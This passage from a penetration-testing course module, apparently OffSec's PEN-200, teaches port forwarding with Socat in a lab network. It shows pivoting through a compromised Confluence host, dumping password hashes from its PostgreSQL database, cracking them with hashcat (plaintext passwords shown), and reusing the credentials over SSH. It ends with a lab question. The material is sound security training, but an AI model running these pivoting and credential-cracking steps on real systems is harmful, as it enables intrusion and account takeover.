In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer
